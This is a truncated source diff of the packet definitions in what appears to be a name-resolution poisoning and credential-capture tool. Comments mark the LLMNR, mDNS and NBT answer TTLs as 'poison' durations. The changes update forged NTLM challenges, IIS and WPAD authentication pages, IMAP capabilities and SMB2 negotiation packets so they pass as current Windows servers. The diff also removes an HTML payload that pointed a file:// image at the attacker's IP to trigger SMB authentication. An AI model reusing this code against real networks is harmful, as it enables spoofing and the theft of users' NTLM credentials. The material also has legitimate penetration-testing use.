@@ -52,7 +52,7 @@ class NBT_Ans(Packet):
 		("NbtName",       ""),
 		("Type",          "\x00\x20"),
 		("Classy",        "\x00\x01"),
-		("TTL",           "\x00\x00\x00\xa5"),
+		("TTL",           "\x00\x04\x93\xe0"), #TTL: 3 days, 11 hours, 20 minutes (Default windows behavior)
 		("Len",           "\x00\x06"),
 		("Flags1",        "\x00\x00"),
 		("IP",            "\x00\x00\x00\x00"),
@@ -215,7 +215,7 @@ class DNS_SRV_Ans(Packet):
 	def calculate(self,data):
 		self.fields["Tid"] = data[0:2]
 		DNSName = ''.join(data[12:].split('\x00')[:1])
-		SplitFQDN =  re.split('\W+', DNSName) # split the ldap.tcp.blah.blah.blah.domain.tld
+		SplitFQDN =  re.split(r'\W+', DNSName) # split the ldap.tcp.blah.blah.blah.domain.tld
 
 		#What's the question? we need it first to calc all other len.
 		self.fields["QuestionName"] = DNSName
@@ -263,7 +263,7 @@ class LLMNR_Ans(Packet):
 		("AnswerNameNull",   "\x00"),
 		("Type1",            "\x00\x01"),
 		("Class1",           "\x00\x01"),
-		("TTL",              "\x00\x00\x00\x1e"),##Poison for 30 sec.
+		("TTL",              "\x00\x00\x00\x1e"),##Poison for 30 sec (Default windows behavior)
 		("IPLen",            "\x00\x04"),
 		("IP",               "\x00\x00\x00\x00"),
 	])
@@ -292,7 +292,7 @@ class LLMNR6_Ans(Packet):
 		("AnswerNameNull",   "\x00"),
 		("Type1",            "\x00\x1c"),
 		("Class1",           "\x00\x01"),
-		("TTL",              "\x00\x00\x00\x1e"),##Poison for 30 sec.
+		("TTL",              "\x00\x00\x00\x1e"),##Poison for 30 sec (Default windows behavior).
 		("IPLen",            "\x00\x04"),
 		("IP",               "\x00\x00\x00\x00"),
 	])
@@ -316,7 +316,7 @@ class MDNS_Ans(Packet):
 		("AnswerNameNull",   "\x00"),
 		("Type",             "\x00\x01"),
 		("Class",            "\x00\x01"),
-		("TTL",              "\x00\x00\x00\x78"),##Poison for 2mn.
+		("TTL",              "\x00\x00\x00\x78"),##Poison for 2mn (Default windows behavior)
 		("IPLen",            "\x00\x04"),
 		("IP",               "\x00\x00\x00\x00"),
 	])
@@ -338,7 +338,7 @@ class MDNS6_Ans(Packet):
 		("AnswerNameNull",   "\x00"),
 		("Type",             "\x00\x1c"),
 		("Class",            "\x00\x01"),
-		("TTL",              "\x00\x00\x00\x78"),##Poison for 2mn.
+		("TTL",              "\x00\x00\x00\x78"),##Poison for 2mn (Default windows behavior)
 		("IPLen",            "\x00\x04"),
 		("IP",               "\x00\x00\x00\x00"),
 	])
@@ -365,7 +365,7 @@ class NTLM_Challenge(Packet):
 		("TargetInfoLen",    "\x7e\x00"),
 		("TargetInfoMaxLen", "\x7e\x00"),
 		("TargetInfoOffset", "\x3e\x00\x00\x00"),
-		("NTLMOsVersion",    "\x05\x02\xce\x0e\x00\x00\x00\x0f"),
+		("NTLMOsVersion",    "\x0a\x00\x7c\x4f\x00\x00\x00\x0f"),
 		("TargetNameStr",    settings.Config.Domain),
 		("Av1",              "\x02\x00"),#nbt name
 		("Av1Len",           "\x06\x00"),
@@ -426,25 +426,59 @@ class NTLM_Challenge(Packet):
 class IIS_Auth_401_Ans(Packet):
 	fields = OrderedDict([
 		("Code",          "HTTP/1.1 401 Unauthorized\r\n"),
-		("ServerType",    "Server: Microsoft-IIS/7.5\r\n"),
-		("Date",          "Date: "+HTTPCurrentDate()+"\r\n"),
 		("Type",          "Content-Type: text/html\r\n"),
-		("WWW-Auth",      "WWW-Authenticate: NTLM\r\n"),
-		("Len",           "Content-Length: 0\r\n"),
-		("CRLF",          "\r\n"),
+		("ServerType",    "Server: Microsoft-IIS/10.0\r\n"),
+		("Date",          "Date: "+HTTPCurrentDate()+"\r\n"),
+		("WWW-Auth",      "WWW-Authenticate: Negotiate\r\n"),
+		("WWW-Auth2",     "WWW-Authenticate: NTLM\r\n"),
+		("Len",           "Content-Length: "),
+		("ActualLen",     "76"),
+		("CRLF",          "\r\n\r\n"),
+		("Payload",       """<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/>
+<title>401 - Unauthorized: Access is denied due to invalid credentials.</title>
+<style type="text/css">
+<!--
+body{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}
+fieldset{padding:0 15px 10px 15px;} 
+h1{font-size:2.4em;margin:0;color:#FFF;}
+h2{font-size:1.7em;margin:0;color:#CC0000;} 
+h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;} 
+#header{width:96%;margin:0 0 0 0;padding:6px 2% 6px 2%;font-family:"trebuchet MS", Verdana, sans-serif;color:#FFF;
+background-color:#555555;}
+#content{margin:0 0 0 2%;position:relative;}
+.content-container{background:#FFF;width:96%;margin-top:8px;padding:10px;position:relative;}
+-->
+</style>
+</head>
+<body>
+<div id="header"><h1>Server Error</h1></div>
+<div id="content">
+ <div class="content-container"><fieldset>
+  <h2>401 - Unauthorized: Access is denied due to invalid credentials.</h2>
+  <h3>You do not have permission to view this directory or page using the credentials that you supplied.</h3>
+ </fieldset></div>
+</div>
+</body>
+</html>
+"""),
 	])
+	def calculate(self):
+		self.fields["ActualLen"] = len(str(self.fields["Payload"]))
 
 class IIS_Auth_Granted(Packet):
 	fields = OrderedDict([
 		("Code",          "HTTP/1.1 200 OK\r\n"),
-		("ServerType",    "Server: Microsoft-IIS/7.5\r\n"),
+		("ServerType",    "Server: Microsoft-IIS/10.0\r\n"),
 		("Date",          "Date: "+HTTPCurrentDate()+"\r\n"),
 		("Type",          "Content-Type: text/html\r\n"),
 		("WWW-Auth",      "WWW-Authenticate: NTLM\r\n"),
 		("ContentLen",    "Content-Length: "),
 		("ActualLen",     "76"),
 		("CRLF",          "\r\n\r\n"),
-		("Payload",       "<html>\n<head>\n</head>\n<body>\n<img src='file:\\\\\\\\\\\\"+RespondWithIP()+"\\smileyd.ico' alt='Loading' height='1' width='2'>\n</body>\n</html>\n"),
+		("Payload",       ""),
 	])
 	def calculate(self):
 		self.fields["ActualLen"] = len(str(self.fields["Payload"]))
@@ -452,22 +486,29 @@ class IIS_Auth_Granted(Packet):
 class IIS_NTLM_Challenge_Ans(Packet):
 	fields = OrderedDict([
 		("Code",          "HTTP/1.1 401 Unauthorized\r\n"),
-		("ServerType",    "Server: Microsoft-IIS/7.5\r\n"),
+		("ServerType",    "Server: Microsoft-IIS/10.0\r\n"),
 		("Date",          "Date: "+HTTPCurrentDate()+"\r\n"),
 		("Type",          "Content-Type: text/html\r\n"),
 		("WWWAuth",       "WWW-Authenticate: NTLM "),
 		("Payload",       ""),
 		("Payload-CRLF",  "\r\n"),
-		("Len",           "Content-Length: 0\r\n"),
-		("CRLF",          "\r\n"),
+		("ContentLen",    "Content-Length: "),
+		("ActualLen",     "76"),
+		("CRLF",          "\r\n\r\n"),
+		("Payload2",       """<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN""http://www.w3.org/TR/html4/strict.dtd">
+<HTML><HEAD><TITLE>Not Authorized</TITLE>
+<META HTTP-EQUIV="Content-Type" Content="text/html; charset=us-ascii"></HEAD>
+<BODY><h2>Not Authorized</h2>
+<hr><p>HTTP Error 401. The requested resource requires user authentication.</p>
+</BODY></HTML>
+"""),
 	])
-
-	def calculate(self,payload):
-		self.fields["Payload"] = b64encode(payload)
+	def calculate(self):
+		self.fields["ActualLen"] = len(str(self.fields["Payload2"]))
 
 class WinRM_NTLM_Challenge_Ans(Packet):
 	fields = OrderedDict([
-		("Code",          "HTTP/1.1 401 \r\n"),
+		("Code",          "HTTP/1.1 401\r\n"),
 		("WWWAuth",       "WWW-Authenticate: Negotiate "),
 		("Payload",       ""),
 		("Payload-CRLF",  "\r\n"),
@@ -483,23 +524,54 @@ class WinRM_NTLM_Challenge_Ans(Packet):
 class IIS_Basic_401_Ans(Packet):
 	fields = OrderedDict([
 		("Code",          "HTTP/1.1 401 Unauthorized\r\n"),
-		("ServerType",    "Server: Microsoft-IIS/7.5\r\n"),
-		("Date",          "Date: "+HTTPCurrentDate()+"\r\n"),
+		("ServerType",    "Server: Microsoft-IIS/10.0\r\n"),
 		("Type",          "Content-Type: text/html\r\n"),
 		("WWW-Auth",      "WWW-Authenticate: Basic realm=\"Authentication Required\"\r\n"),
-		("AllowOrigin",   "Access-Control-Allow-Origin: *\r\n"),
-		("AllowCreds",    "Access-Control-Allow-Credentials: true\r\n"),
-		("Len",           "Content-Length: 0\r\n"),
-		("CRLF",          "\r\n"),
+		("Date",          "Date: "+HTTPCurrentDate()+"\r\n"),
+		("Len",           "Content-Length: "),
+		("ActualLen",     "76"),
+		("CRLF",          "\r\n\r\n"),
+		("Payload",       """<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/>
+<title>401 - Unauthorized: Access is denied due to invalid credentials.</title>
+<style type="text/css">
+<!--
+body{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}
+fieldset{padding:0 15px 10px 15px;} 
+h1{font-size:2.4em;margin:0;color:#FFF;}
+h2{font-size:1.7em;margin:0;color:#CC0000;} 
+h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;} 
+#header{width:96%;margin:0 0 0 0;padding:6px 2% 6px 2%;font-family:"trebuchet MS", Verdana, sans-serif;color:#FFF;
+background-color:#555555;}
+#content{margin:0 0 0 2%;position:relative;}
+.content-container{background:#FFF;width:96%;margin-top:8px;padding:10px;position:relative;}
+-->
+</style>
+</head>
+<body>
+<div id="header"><h1>Server Error</h1></div>
+<div id="content">
+ <div class="content-container"><fieldset>
+  <h2>401 - Unauthorized: Access is denied due to invalid credentials.</h2>
+  <h3>You do not have permission to view this directory or page using the credentials that you supplied.</h3>
+ </fieldset></div>
+</div>
+</body>
+</html>
+"""),
 	])
+	def calculate(self):
+		self.fields["ActualLen"] = len(str(self.fields["Payload"]))
 
 ##### Proxy mode Packets #####
 class WPADScript(Packet):
 	fields = OrderedDict([
 		("Code",          "HTTP/1.1 200 OK\r\n"),
-		("ServerTlype",    "Server: Microsoft-IIS/7.5\r\n"),
-		("Date",          "Date: "+HTTPCurrentDate()+"\r\n"),
 		("Type",          "Content-Type: application/x-ns-proxy-autoconfig\r\n"),
+		("Cache",         "Pragma: no-cache\r\n"),
+		("Server",        "Server: BigIP\r\n"),
 		("ContentLen",    "Content-Length: "),
 		("ActualLen",     "76"),
 		("CRLF",          "\r\n\r\n"),
@@ -514,7 +586,7 @@ class ServeExeFile(Packet):
 		("ContentType",   "Content-Type: application/octet-stream\r\n"),
 		("LastModified",  "Last-Modified: "+HTTPCurrentDate()+"\r\n"),
 		("AcceptRanges",  "Accept-Ranges: bytes\r\n"),
-		("Server",        "Server: Microsoft-IIS/7.5\r\n"),
+		("Server",        "Server: Microsoft-IIS/10.0\r\n"),
 		("ContentDisp",   "Content-Disposition: attachment; filename="),
 		("ContentDiFile", ""),
 		("FileCRLF",      ";\r\n"),
@@ -536,7 +608,7 @@ class ServeHtmlFile(Packet):
 		("ContentType",   "Content-Type: text/html\r\n"),
 		("LastModified",  "Last-Modified: "+HTTPCurrentDate()+"\r\n"),
 		("AcceptRanges",  "Accept-Ranges: bytes\r\n"),
-		("Server",        "Server: Microsoft-IIS/7.5\r\n"),
+		("Server",        "Server: Microsoft-IIS/10.0\r\n"),
 		("ContentLen",    "Content-Length: "),
 		("ActualLen",     "76"),
 		("Date",          "\r\nDate: "+HTTPCurrentDate()+"\r\n"),
@@ -551,7 +623,7 @@ class ServeHtmlFile(Packet):
 class WPAD_Auth_407_Ans(Packet):
 	fields = OrderedDict([
 		("Code",          "HTTP/1.1 407 Unauthorized\r\n"),
-		("ServerType",    "Server: Microsoft-IIS/7.5\r\n"),
+		("ServerType",    "Server: Microsoft-IIS/10.0\r\n"),
 		("Date",          "Date: "+HTTPCurrentDate()+"\r\n"),
 		("Type",          "Content-Type: text/html\r\n"),
 		("WWW-Auth",      "Proxy-Authenticate: NTLM\r\n"),
@@ -567,7 +639,7 @@ class WPAD_Auth_407_Ans(Packet):
 class WPAD_NTLM_Challenge_Ans(Packet):
 	fields = OrderedDict([
 		("Code",          "HTTP/1.1 407 Unauthorized\r\n"),
-		("ServerType",    "Server: Microsoft-IIS/7.5\r\n"),
+		("ServerType",    "Server: Microsoft-IIS/10.0\r\n"),
 		("Date",          "Date: "+HTTPCurrentDate()+"\r\n"),
 		("Type",          "Content-Type: text/html\r\n"),
 		("WWWAuth",       "Proxy-Authenticate: NTLM "),
@@ -583,7 +655,7 @@ class WPAD_NTLM_Challenge_Ans(Packet):
 class WPAD_Basic_407_Ans(Packet):
 	fields = OrderedDict([
 		("Code",          "HTTP/1.1 407 Unauthorized\r\n"),
-		("ServerType",    "Server: Microsoft-IIS/7.5\r\n"),
+		("ServerType",    "Server: Microsoft-IIS/10.0\r\n"),
 		("Date",          "Date: "+HTTPCurrentDate()+"\r\n"),
 		("Type",          "Content-Type: text/html\r\n"),
 		("WWW-Auth",      "Proxy-Authenticate: Basic realm=\"Authentication Required\"\r\n"),
@@ -600,7 +672,7 @@ class WEBDAV_Options_Answer(Packet):
 	fields = OrderedDict([
 		("Code",          "HTTP/1.1 200 OK\r\n"),
 		("Date",          "Date: "+HTTPCurrentDate()+"\r\n"),
-		("ServerType",    "Server: Microsoft-IIS/7.5\r\n"),
+		("ServerType",    "Server: Microsoft-IIS/10.0\r\n"),
 		("Allow",         "Allow: GET,HEAD,POST,OPTIONS,TRACE\r\n"),
 		("Len",           "Content-Length: 0\r\n"),
 		("Keep-Alive:", "Keep-Alive: timeout=5, max=100\r\n"),
@@ -688,7 +760,7 @@ class MSSQLNTLMChallengeAnswer(Packet):
 		("TargetInfoLen",    "\x7e\x00"),
 		("TargetInfoMaxLen", "\x7e\x00"),
 		("TargetInfoOffset", "\x3e\x00\x00\x00"),
-		("NTLMOsVersion",    "\x05\x02\xce\x0e\x00\x00\x00\x0f"),
+		("NTLMOsVersion",    "\x0a\x00\x7c\x4f\x00\x00\x00\x0f"),
 		("TargetNameStr",    settings.Config.Domain),
 		("Av1",              "\x02\x00"),#nbt name
 		("Av1Len",           "\x06\x00"),
@@ -789,7 +861,7 @@ class IMAPGreeting(Packet):
 
 class IMAPCapability(Packet):
 	fields = OrderedDict([
-		("Code",     "* CAPABILITY IMAP4 IMAP4rev1 AUTH=PLAIN"),
+		("Code",     "* CAPABILITY IMAP4 IMAP4rev1 AUTH=PLAIN AUTH=LOGIN AUTH=NTLM"),
 		("CRLF",     "\r\n"),
 	])
 
@@ -798,6 +870,24 @@ class IMAPCapabilityEnd(Packet):
 		("Tag",     ""),
 		("Message", " OK CAPABILITY completed."),
 		("CRLF",    "\r\n"),
+	])
+
+##### MQTT Packets #####
+class MQTTv3v4ResponsePacket(Packet):
+	fields = OrderedDict([
+		("Type",	"\x20"),
+		("Len", 	"\x02"),
+		("Session",	"\x00"),
+		("Code", 	"\x04"),
+	])
+
+class MQTTv5ResponsePacket(Packet):
+	fields = OrderedDict([
+		("Type",	"\x20"),
+		("Len", 	"\x03"),
+		("Session",	"\x00"),
+		("Code", 	"\x86"),
+		("Prop", 	"\x00"),
 	])
 
 ##### POP3 Packets #####
@@ -945,9 +1035,9 @@ class LDAPNTLMChallenge(Packet):
 		("NTLMSSPNtTargetInfoLen",                    "\x94\x00"),
 		("NTLMSSPNtTargetInfoMaxLen",                 "\x94\x00"),
 		("NTLMSSPNtTargetInfoBuffOffset",             "\x56\x00\x00\x00"),
-		("NegTokenInitSeqMechMessageVersionHigh",     "\x05"),
-		("NegTokenInitSeqMechMessageVersionLow",      "\x02"),
-		("NegTokenInitSeqMechMessageVersionBuilt",    "\xce\x0e"),
+		("NegTokenInitSeqMechMessageVersionHigh",     "\x0a"),
+		("NegTokenInitSeqMechMessageVersionLow",      "\x00"),
+		("NegTokenInitSeqMechMessageVersionBuilt",    "\x7c\x4f"),
 		("NegTokenInitSeqMechMessageVersionReserved", "\x00\x00\x00"),
 		("NegTokenInitSeqMechMessageVersionNTLMType", "\x0f"),
 		("NTLMSSPNtWorkstationName",                  settings.Config.Domain),
@@ -1158,42 +1248,6 @@ class SMBSessionData(Packet):
 		CompleteBCC = str(self.fields["AccountPassword"])+str(self.fields["AccountName"])+str(self.fields["AccountNameTerminator"])+str(self.fields["PrimaryDomain"])+str(self.fields["PrimaryDomainTerminator"])+str(self.fields["NativeOs"])+str(self.fields["NativeOsTerminator"])+str(self.fields["NativeLanman"])+str(self.fields["NativeLanmanTerminator"])
 		self.fields["bcc"] = StructWithLenPython2or3("<h", len(CompleteBCC))
 		self.fields["PasswordLen"] = StructWithLenPython2or3("<h", len(str(self.fields["AccountPassword"])))
-
-class SMBNegoFingerData(Packet):
-	fields = OrderedDict([
-		("separator1","\x02" ),
-		("dialect1", "\x50\x43\x20\x4e\x45\x54\x57\x4f\x52\x4b\x20\x50\x52\x4f\x47\x52\x41\x4d\x20\x31\x2e\x30\x00"),
-		("separator2","\x02"),
-		("dialect2", "\x4c\x41\x4e\x4d\x41\x4e\x31\x2e\x30\x00"),
-		("separator3","\x02"),
-		("dialect3", "\x57\x69\x6e\x64\x6f\x77\x73\x20\x66\x6f\x72\x20\x57\x6f\x72\x6b\x67\x72\x6f\x75\x70\x73\x20\x33\x2e\x31\x61\x00"),
-		("separator4","\x02"),
-		("dialect4", "\x4c\x4d\x31\x2e\x32\x58\x30\x30\x32\x00"),
-		("separator5","\x02"),
-		("dialect5", "\x4c\x41\x4e\x4d\x41\x4e\x32\x2e\x31\x00"),
-		("separator6","\x02"),
-		("dialect6", "\x4e\x54\x20\x4c\x4d\x20\x30\x2e\x31\x32\x00"),
-	])
-
-class SMBSessionFingerData(Packet):
-	fields = OrderedDict([
-		("wordcount", "\x0c"),
-		("AndXCommand", "\xff"),
-		("reserved","\x00" ),
-		("andxoffset", "\x00\x00"),
-		("maxbuff","\x04\x11"),
-		("maxmpx", "\x32\x00"),
-		("vcnum","\x00\x00"),
-		("sessionkey", "\x00\x00\x00\x00"),
-		("securitybloblength","\x4a\x00"),
-		("reserved2","\x00\x00\x00\x00"),
-		("capabilities", "\xd4\x00\x00\xa0"),
-		("bcc1",""),
-		("Data","\x60\x48\x06\x06\x2b\x06\x01\x05\x05\x02\xa0\x3e\x30\x3c\xa0\x0e\x30\x0c\x06\x0a\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x0a\xa2\x2a\x04\x28\x4e\x54\x4c\x4d\x53\x53\x50\x00\x01\x00\x00\x00\x07\x82\x08\xa2\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x01\x28\x0a\x00\x00\x00\x0f\x00\x57\x00\x69\x00\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00\x20\x00\x32\x00\x30\x00\x30\x00\x32\x00\x20\x00\x53\x00\x65\x00\x72\x00\x76\x00\x69\x00\x63\x00\x65\x00\x20\x00\x50\x00\x61\x00\x63\x00\x6b\x00\x20\x00\x33\x00\x20\x00\x32\x00\x36\x00\x30\x00\x30\x00\x00\x00\x57\x00\x69\x00\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00\x20\x00\x32\x00\x30\x00\x30\x00\x32\x00\x20\x00\x35\x00\x2e\x00\x31\x00\x00\x00\x00\x00"),
-
-	])
-	def calculate(self):
-		self.fields["bcc1"] = StructPython2or3('<h',self.fields["Data"])
 
 class SMBTreeConnectData(Packet):
 	fields = OrderedDict([
@@ -1678,7 +1732,7 @@ class SMB2NegoAns(Packet):
 		("Signing",         "\x01\x00"),
 		("Dialect",         "\xff\x02"),
 		("Reserved",        "\x00\x00"),
-		("Guid",            "\xee\x85\xab\xf7\xea\xf6\x0c\x4f\x92\x81\x92\x47\x6d\xeb\x76\xa9"),
+		("Guid",            urandom(16).decode('latin-1')),
 		("Capabilities",    "\x07\x00\x00\x00"),
 		("MaxTransSize",    "\x00\x00\x10\x00"),
 		("MaxReadSize",     "\x00\x00\x10\x00"),
@@ -1701,9 +1755,9 @@ class SMB2NegoAns(Packet):
 		("NegTokenTag0ASNLen",        "\x3c"),
 		("NegThisMechASNId",          "\x30"),
 		("NegThisMechASNLen",         "\x3a"),
-		("NegThisMech1ASNId",         "\x06"),
-		("NegThisMech1ASNLen",        "\x0a"),
-		("NegThisMech1ASNStr",        "\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x1e"),
+		#("NegThisMech1ASNId",         "\x06"),
+		#("NegThisMech1ASNLen",        "\x0a"),
+		#("NegThisMech1ASNStr",        "\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x1e"),
 		("NegThisMech2ASNId",         "\x06"),
 		("NegThisMech2ASNLen",        "\x09"),
 		("NegThisMech2ASNStr",        "\x2a\x86\x48\x82\xf7\x12\x01\x02\x02"),
@@ -1732,14 +1786,14 @@ class SMB2NegoAns(Packet):
 
 		StructLen = str(self.fields["Len"])+str(self.fields["Signing"])+str(self.fields["Dialect"])+str(self.fields["Reserved"])+str(self.fields["Guid"])+str(self.fields["Capabilities"])+str(self.fields["MaxTransSize"])+str(self.fields["MaxReadSize"])+str(self.fields["MaxWriteSize"])+str(self.fields["SystemTime"])+str(self.fields["BootTime"])+str(self.fields["SecBlobOffSet"])+str(self.fields["SecBlobLen"])+str(self.fields["Reserved2"])
                  
-		SecBlobLen = str(self.fields["InitContextTokenASNId"])+str(self.fields["InitContextTokenASNLen"])+str(self.fields["ThisMechASNId"])+str(self.fields["ThisMechASNLen"])+str(self.fields["ThisMechASNStr"])+str(self.fields["SpNegoTokenASNId"])+str(self.fields["SpNegoTokenASNLen"])+str(self.fields["NegTokenASNId"])+str(self.fields["NegTokenASNLen"])+str(self.fields["NegTokenTag0ASNId"])+str(self.fields["NegTokenTag0ASNLen"])+str(self.fields["NegThisMechASNId"])+str(self.fields["NegThisMechASNLen"])+str(self.fields["NegThisMech1ASNId"])+str(self.fields["NegThisMech1ASNLen"])+str(self.fields["NegThisMech1ASNStr"])+str(self.fields["NegThisMech2ASNId"])+str(self.fields["NegThisMech2ASNLen"])+str(self.fields["NegThisMech2ASNStr"])+str(self.fields["NegThisMech3ASNId"])+str(self.fields["NegThisMech3ASNLen"])+str(self.fields["NegThisMech3ASNStr"])+str(self.fields["NegThisMech4ASNId"])+str(self.fields["NegThisMech4ASNLen"])+str(self.fields["NegThisMech4ASNStr"])+str(self.fields["NegThisMech5ASNId"])+str(self.fields["NegThisMech5ASNLen"])+str(self.fields["NegThisMech5ASNStr"])+str(self.fields["NegTokenTag3ASNId"])+str(self.fields["NegTokenTag3ASNLen"])+str(self.fields["NegHintASNId"])+str(self.fields["NegHintASNLen"])+str(self.fields["NegHintTag0ASNId"])+str(self.fields["NegHintTag0ASNLen"])+str(self.fields["NegHintFinalASNId"])+str(self.fields["NegHintFinalASNLen"])+str(self.fields["NegHintFinalASNStr"])
+		SecBlobLen = str(self.fields["InitContextTokenASNId"])+str(self.fields["InitContextTokenASNLen"])+str(self.fields["ThisMechASNId"])+str(self.fields["ThisMechASNLen"])+str(self.fields["ThisMechASNStr"])+str(self.fields["SpNegoTokenASNId"])+str(self.fields["SpNegoTokenASNLen"])+str(self.fields["NegTokenASNId"])+str(self.fields["NegTokenASNLen"])+str(self.fields["NegTokenTag0ASNId"])+str(self.fields["NegTokenTag0ASNLen"])+str(self.fields["NegThisMechASNId"])+str(self.fields["NegThisMechASNLen"])+str(self.fields["NegThisMech2ASNId"])+str(self.fields["NegThisMech2ASNLen"])+str(self.fields["NegThisMech2ASNStr"])+str(self.fields["NegThisMech3ASNId"])+str(self.fields["NegThisMech3ASNLen"])+str(self.fields["NegThisMech3ASNStr"])+str(self.fields["NegThisMech4ASNId"])+str(self.fields["NegThisMech4ASNLen"])+str(self.fields["NegThisMech4ASNStr"])+str(self.fields["NegThisMech5ASNId"])+str(self.fields["NegThisMech5ASNLen"])+str(self.fields["NegThisMech5ASNStr"])+str(self.fields["NegTokenTag3ASNId"])+str(self.fields["NegTokenTag3ASNLen"])+str(self.fields["NegHintASNId"])+str(self.fields["NegHintASNLen"])+str(self.fields["NegHintTag0ASNId"])+str(self.fields["NegHintTag0ASNLen"])+str(self.fields["NegHintFinalASNId"])+str(self.fields["NegHintFinalASNLen"])+str(self.fields["NegHintFinalASNStr"])
 
 
-		AsnLenStart = str(self.fields["ThisMechASNId"])+str(self.fields["ThisMechASNLen"])+str(self.fields["ThisMechASNStr"])+str(self.fields["SpNegoTokenASNId"])+str(self.fields["SpNegoTokenASNLen"])+str(self.fields["NegTokenASNId"])+str(self.fields["NegTokenASNLen"])+str(self.fields["NegTokenTag0ASNId"])+str(self.fields["NegTokenTag0ASNLen"])+str(self.fields["NegThisMechASNId"])+str(self.fields["NegThisMechASNLen"])+str(self.fields["NegThisMech1ASNId"])+str(self.fields["NegThisMech1ASNLen"])+str(self.fields["NegThisMech1ASNStr"])+str(self.fields["NegThisMech2ASNId"])+str(self.fields["NegThisMech2ASNLen"])+str(self.fields["NegThisMech2ASNStr"])+str(self.fields["NegThisMech3ASNId"])+str(self.fields["NegThisMech3ASNLen"])+str(self.fields["NegThisMech3ASNStr"])+str(self.fields["NegThisMech4ASNId"])+str(self.fields["NegThisMech4ASNLen"])+str(self.fields["NegThisMech4ASNStr"])+str(self.fields["NegThisMech5ASNId"])+str(self.fields["NegThisMech5ASNLen"])+str(self.fields["NegThisMech5ASNStr"])+str(self.fields["NegTokenTag3ASNId"])+str(self.fields["NegTokenTag3ASNLen"])+str(self.fields["NegHintASNId"])+str(self.fields["NegHintASNLen"])+str(self.fields["NegHintTag0ASNId"])+str(self.fields["NegHintTag0ASNLen"])+str(self.fields["NegHintFinalASNId"])+str(self.fields["NegHintFinalASNLen"])+str(self.fields["NegHintFinalASNStr"])
+		AsnLenStart = str(self.fields["ThisMechASNId"])+str(self.fields["ThisMechASNLen"])+str(self.fields["ThisMechASNStr"])+str(self.fields["SpNegoTokenASNId"])+str(self.fields["SpNegoTokenASNLen"])+str(self.fields["NegTokenASNId"])+str(self.fields["NegTokenASNLen"])+str(self.fields["NegTokenTag0ASNId"])+str(self.fields["NegTokenTag0ASNLen"])+str(self.fields["NegThisMechASNId"])+str(self.fields["NegThisMechASNLen"])+str(self.fields["NegThisMech2ASNId"])+str(self.fields["NegThisMech2ASNLen"])+str(self.fields["NegThisMech2ASNStr"])+str(self.fields["NegThisMech3ASNId"])+str(self.fields["NegThisMech3ASNLen"])+str(self.fields["NegThisMech3ASNStr"])+str(self.fields["NegThisMech4ASNId"])+str(self.fields["NegThisMech4ASNLen"])+str(self.fields["NegThisMech4ASNStr"])+str(self.fields["NegThisMech5ASNId"])+str(self.fields["NegThisMech5ASNLen"])+str(self.fields["NegThisMech5ASNStr"])+str(self.fields["NegTokenTag3ASNId"])+str(self.fields["NegTokenTag3ASNLen"])+str(self.fields["NegHintASNId"])+str(self.fields["NegHintASNLen"])+str(self.fields["NegHintTag0ASNId"])+str(self.fields["NegHintTag0ASNLen"])+str(self.fields["NegHintFinalASNId"])+str(self.fields["NegHintFinalASNLen"])+str(self.fields["NegHintFinalASNStr"])
 
-		AsnLen2 = str(self.fields["NegTokenASNId"])+str(self.fields["NegTokenASNLen"])+str(self.fields["NegTokenTag0ASNId"])+str(self.fields["NegTokenTag0ASNLen"])+str(self.fields["NegThisMechASNId"])+str(self.fields["NegThisMechASNLen"])+str(self.fields["NegThisMech1ASNId"])+str(self.fields["NegThisMech1ASNLen"])+str(self.fields["NegThisMech1ASNStr"])+str(self.fields["NegThisMech2ASNId"])+str(self.fields["NegThisMech2ASNLen"])+str(self.fields["NegThisMech2ASNStr"])+str(self.fields["NegThisMech3ASNId"])+str(self.fields["NegThisMech3ASNLen"])+str(self.fields["NegThisMech3ASNStr"])+str(self.fields["NegThisMech4ASNId"])+str(self.fields["NegThisMech4ASNLen"])+str(self.fields["NegThisMech4ASNStr"])+str(self.fields["NegThisMech5ASNId"])+str(self.fields["NegThisMech5ASNLen"])+str(self.fields["NegThisMech5ASNStr"])+str(self.fields["NegTokenTag3ASNId"])+str(self.fields["NegTokenTag3ASNLen"])+str(self.fields["NegHintASNId"])+str(self.fields["NegHintASNLen"])+str(self.fields["NegHintTag0ASNId"])+str(self.fields["NegHintTag0ASNLen"])+str(self.fields["NegHintFinalASNId"])+str(self.fields["NegHintFinalASNLen"])+str(self.fields["NegHintFinalASNStr"])
+		AsnLen2 = str(self.fields["NegTokenASNId"])+str(self.fields["NegTokenASNLen"])+str(self.fields["NegTokenTag0ASNId"])+str(self.fields["NegTokenTag0ASNLen"])+str(self.fields["NegThisMechASNId"])+str(self.fields["NegThisMechASNLen"])+str(self.fields["NegThisMech2ASNId"])+str(self.fields["NegThisMech2ASNLen"])+str(self.fields["NegThisMech2ASNStr"])+str(self.fields["NegThisMech3ASNId"])+str(self.fields["NegThisMech3ASNLen"])+str(self.fields["NegThisMech3ASNStr"])+str(self.fields["NegThisMech4ASNId"])+str(self.fields["NegThisMech4ASNLen"])+str(self.fields["NegThisMech4ASNStr"])+str(self.fields["NegThisMech5ASNId"])+str(self.fields["NegThisMech5ASNLen"])+str(self.fields["NegThisMech5ASNStr"])+str(self.fields["NegTokenTag3ASNId"])+str(self.fields["NegTokenTag3ASNLen"])+str(self.fields["NegHintASNId"])+str(self.fields["NegHintASNLen"])+str(self.fields["NegHintTag0ASNId